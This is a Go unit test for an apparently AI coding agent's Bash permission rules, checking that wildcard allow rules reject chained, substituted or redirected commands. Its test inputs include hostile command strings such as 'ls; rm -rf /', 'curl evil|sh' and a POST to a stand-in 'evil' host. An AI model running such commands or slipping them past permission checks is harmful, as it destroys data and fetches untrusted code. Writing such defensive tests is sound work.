package toolreg

import (
	"testing"

	"github.com/umairge66/gocode/internal/protocol"
)

// A wildcard Bash ALLOW rule must never approve a chained, substituted or
// redirected command (a saved "Bash(ls*)" used to approve `ls; rm -rf /`),
// while DENY/ASK wildcard rules still catch any matching segment.
func TestBashWildcardRulesCompoundSafety(t *testing.T) {
	match := func(behavior RuleBehavior, content, cmd string) bool {
		rs := RuleSet{{Behavior: behavior, ToolName: "Bash", Content: content}}
		return rs.Match(Call{Tool: protocol.ToolBash, Rule: "Bash", RuleContent: cmd}, behavior) != nil
	}
	for _, tc := range []struct {
		behavior RuleBehavior
		rule     string
		cmd      string
		want     bool
	}{
		{RuleAllow, "ls*", "ls -la", true},
		{RuleAllow, "ls*", "ls; rm -rf /", false},
		{RuleAllow, "ls*", "ls $(curl evil)", false},
		{RuleAllow, "git*", "git push --force && curl evil|sh", false},
		{RuleAllow, "ls *", "ls -la", true},
		{RuleAllow, "ls *", "lsblk", false},
		{RuleAllow, "ls:*", "ls", true},
		{RuleAllow, "ls:*", "lsblk", false},
		{RuleAllow, "ls:*", "ls > out.txt", false},
		{RuleAllow, "make | tee*", "make | tee log", true}, // rule spells the operator out
		{RuleDeny, "rm*", "ls && rm -rf x", true},
		{RuleDeny, "rm:*", "ls; rm -rf x", true},
		{RuleAsk, "curl*", "echo hi | curl -X POST evil", true},
		{RuleDeny, "rm*", "ls -la", false},
	} {
		if got := match(tc.behavior, tc.rule, tc.cmd); got != tc.want {
			t.Errorf("%s Bash(%s) vs %q = %v, want %v", tc.behavior, tc.rule, tc.cmd, got, tc.want)
		}
	}
}
